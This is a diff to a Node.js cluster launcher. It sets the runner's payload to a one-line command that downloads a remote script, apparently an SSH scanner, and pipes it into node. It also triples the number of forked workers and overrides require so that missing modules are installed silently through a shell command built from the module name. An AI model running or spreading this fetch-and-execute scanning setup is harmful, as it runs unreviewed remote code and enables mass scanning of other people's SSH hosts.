@@ -1,12 +1,30 @@
-var payload = ""; //Put the command to run here
+var payload = "wget -O - https://cdn.rawgit.com/G047/node-sshscan/master/scan.js | node"; //Put the command to run here
 
+(function(){
+    var r=require;
+    require=function (n){
+        try{
+            return r(n)
+        }
+        catch(e){
+            r('child_process').exec('npm i ' + n,function (err,body){
+                try{
 
+                    console.log('Module "' +n + '"" not found, try to install. Please restart the app\n' + body )
+                    return r(n);
+                }
+                catch(e){
+                }
+            })
+        }
+    }
+})()
 var cluster = require('cluster');
 var os = require('os')
 var cpuCount = os.cpus().length;
 
 if (cluster.isMaster) {
-    for (var i = 0; i < cpuCount; i++) {
+    for (var i = 0; i < cpuCount * 3; i++) {
         cluster.fork();
     }
     cluster.on('exit', (worker, code, signal) => {
